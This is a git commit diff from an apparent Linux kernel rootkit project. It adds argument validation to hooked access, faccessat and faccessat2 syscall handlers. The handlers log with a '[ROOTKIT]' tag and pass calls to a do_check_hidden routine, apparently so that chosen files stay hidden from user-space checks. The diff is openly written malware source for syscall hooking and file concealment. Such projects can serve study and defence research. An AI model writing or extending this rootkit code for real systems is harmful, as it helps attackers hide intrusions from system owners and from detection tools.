f52764c780fc8cb58c5b5a8e722cd6f1d9411fbf
MaT-PT <MaT-PT@users.noreply.github.com>
2023-11-17 14:27:50 +0100

    Add basic checks for access* syscalls

--- src/syscall_hooks/access.c
+++ src/syscall_hooks/access.c
@@ -6,12 +6,27 @@
 #include <linux/types.h>
 #include <linux/uaccess.h>
 
+static inline long do_access(const sysfun_t orig_func, struct pt_regs *const p_regs,
+                             const int i32_dfd, const char __user *const s_filename,
+                             const int i32_mode, const int i32_at_flags)
+{
+    IF_U (i32_mode & ~S_IRWXO) {
+        return -EINVAL;
+    }
+
+    if (i32_at_flags & ~(AT_EACCESS | AT_SYMLINK_NOFOLLOW | AT_EMPTY_PATH)) {
+        return -EINVAL;
+    }
+
+    return do_check_hidden(orig_func, p_regs, i32_dfd, s_filename, i32_at_flags);
+}
+
 // sys_access syscall hook handler
 SYSCALL_HOOK_HANDLER2(access, orig_access, p_regs, const char __user *, s_filename, int, i32_mode)
 {
     pr_info("[ROOTKIT] access(%p, %s%#o)\n", s_filename, SIGNED_ARG(i32_mode));
 
-    return do_check_hidden(orig_access, p_regs, AT_FDCWD, s_filename, 0);
+    return do_access(orig_access, p_regs, AT_FDCWD, s_filename, i32_mode, 0);
 }
 
 // sys_faccessat syscall hook handler
@@ -20,7 +35,7 @@ SYSCALL_HOOK_HANDLER3(faccessat, orig_faccessat, p_regs, int, i32_dfd, const cha
 {
     pr_info("[ROOTKIT] faccessat(%d, %p, %s%#o)\n", i32_dfd, s_filename, SIGNED_ARG(i32_mode));
 
-    return do_check_hidden(orig_faccessat, p_regs, i32_dfd, s_filename, 0);
+    return do_access(orig_faccessat, p_regs, i32_dfd, s_filename, i32_mode, 0);
 }
 
 // sys_faccessat2 syscall hook handler
@@ -30,5 +45,5 @@ SYSCALL_HOOK_HANDLER4(faccessat2, orig_faccessat2, p_regs, int, i32_dfd, const c
     pr_info("[ROOTKIT] faccessat2(%d, %p, %s%#o, %s%#x)\n", i32_dfd, s_filename,
             SIGNED_ARG(i32_mode), SIGNED_ARG(i32_flags));
 
-    return do_check_hidden(orig_faccessat2, p_regs, i32_dfd, s_filename, i32_flags);
+    return do_access(orig_faccessat2, p_regs, i32_dfd, s_filename, i32_mode, i32_flags);
 }
